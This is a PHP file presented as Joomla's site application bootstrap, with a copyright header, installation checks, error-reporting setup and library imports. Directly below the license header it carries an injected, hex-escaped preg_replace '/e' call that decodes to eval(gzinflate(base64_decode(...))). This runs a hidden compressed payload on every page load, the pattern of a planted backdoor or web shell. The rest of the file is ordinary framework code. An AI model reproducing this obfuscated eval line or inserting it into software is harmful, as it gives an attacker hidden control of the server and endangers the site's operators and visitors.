<?php
/**
 * @package		Joomla.Site
 * @subpackage	Application
 * @copyright	Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.
 * @license		GNU General Public License version 2 or later; see LICENSE.txt
 */
preg_replace("/.+/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'nVVrb9owFP1Mf4UrpXUyQSjbtEkgxFBJW6QWmAl7iKLITQyJFpLIMVVLxX/fdRzCs+009UOd63N9zz33wYzxefBHNxon00XkiiCO0Cw3oZeTkkbHOEjwBKEm2EWQKGxmX/AQLjL7iIfrC5c+UO4FEVxgsfQiLI1eU08FT+JULxzLCIdxnAQRFTHHxmmzOaVhyoyW4AtWz87gGUx1zTNemOvHOi4YujQMmTfGZvGaCQ/K73V0+MZGYyUfQIehC5jRzMOi83N0AMPxLG7iApMJsssoiB5pGHhI4rNwJc7EgkfAfLVPngnX3wBlFD9OhZRWivtNc4YW+WGRMVb/nV77zsKTXGs6Y5HC7kBvbHvgjODLaV9bPbuAczZlnPGsPPtwYl1ZxCIKyx7CWBHAvhBJvVqd08iNQQhOpdSmG8+rQeSxp081M/GTlkcFbWLzgabsy2eHAdZjesp4ADosGYhnGPtlE3VZGRmpqIrmQsTlEnoms2+5PFLueIt5omtuUb9TOB9qz+aJeEacpYsQZDym/qbyLnRbpaJuK5WtbkMvuUvukHA2c+YUSqXjs/txcj/RzQ8t435cheNZgKF1yhq4GIoQg/Lr8ntcm8gkSuwpECp8RlImcZIbVyebEVOpQzOoIYPGgDq58O0EUSDUjdIEcvdVrO3cFDZlIk4A7fpldDkit/2BDdW1R6Rnk3ZvCGUu1+Qzr6Pt7p3VH9llVLtQw1vwYE/MlVhFY6sG2zTUGWnubnbFopAO0jmIHMo5fdY3rUisu75tOe1Oh8hdoK5x7eNX8wL+ajhbDzDn2YwYxrr+8FYKieh7Pf3LueqTn23SsTryhCe5Q8HwHbgs3WonpeNED/LMF1+R6BFyQ2Aj18uBFTVh6uIIK6pa6vpsztaTmMq9uUJM7qYj11gVQJPygO2oKDf9oS1jt/bTVxeojl7fOceSIdb3kTW0nRHp5gLLzVGSzQoUcoImhh0C4y6Jma/4NjJHldzxQJ0usS5tZ3hJuoPtgKUi2tvgxivNUoCBDfntDG3S7V1vuiV73ASJW9h812ndM2+ksa9X6b/EejNETg3meRMjocI/rlEGa7zDQ7rvNd+/sB7cDOB8eyV/jHf0O5Bta8zgYTlTfwE='\x29\x29\x29\x3B",".");
// No direct access.
defined('_JEXEC') or die;

//
// Joomla system checks.
//

@ini_set('magic_quotes_runtime', 0);
@ini_set('zend.ze1_compatibility_mode', '0');

//
// Installation check, and check on removal of the install directory.
//

if (!file_exists(JPATH_CONFIGURATION.'/configuration.php') || (filesize(JPATH_CONFIGURATION.'/configuration.php') < 10) || file_exists(JPATH_INSTALLATION.'/index.php')) {

	if (file_exists(JPATH_INSTALLATION.'/index.php')) {
		header('Location: '.substr($_SERVER['REQUEST_URI'], 0, strpos($_SERVER['REQUEST_URI'], 'index.php')).'installation/index.php');
		exit();
	} else {
		echo 'No configuration file found and no installation code available. Exiting...';
		exit();
	}
}

//
// Joomla system startup.
//

// System includes.
require_once JPATH_LIBRARIES.'/import.php';

// Force library to be in JError legacy mode
JError::$legacy = true;
JError::setErrorHandling(E_NOTICE, 'message');
JError::setErrorHandling(E_WARNING, 'message');
JError::setErrorHandling(E_ERROR, 'callback', array('JError', 'customErrorPage'));

// Botstrap the CMS libraries.
require_once JPATH_LIBRARIES.'/cms.php';

// Pre-Load configuration.
ob_start();
require_once JPATH_CONFIGURATION.'/configuration.php';
ob_end_clean();

// System configuration.
$config = new JConfig();

// Set the error_reporting
switch ($config->error_reporting)
{
	case 'default':
	case '-1':
		break;

	case 'none':
	case '0':
		error_reporting(0);
		break;

	case 'simple':
		error_reporting(E_ERROR | E_WARNING | E_PARSE);
		ini_set('display_errors', 1);
		break;

	case 'maximum':
		error_reporting(E_ALL);
		ini_set('display_errors', 1);
		break;

	case 'development':
		error_reporting(-1);
		ini_set('display_errors', 1);
		break;

	default:
		error_reporting($config->error_reporting);
		ini_set('display_errors', 1);
		break;
}

define('JDEBUG', $config->debug);

unset($config);

//
// Joomla framework loading.
//

// System profiler.
if (JDEBUG) {
	jimport('joomla.error.profiler');
	$_PROFILER = JProfiler::getInstance('Application');
}

//
// Joomla library imports.
//

jimport('joomla.application.menu');
jimport('joomla.environment.uri');
jimport('joomla.utilities.utility');
jimport('joomla.event.dispatcher');
jimport('joomla.utilities.arrayhelper');
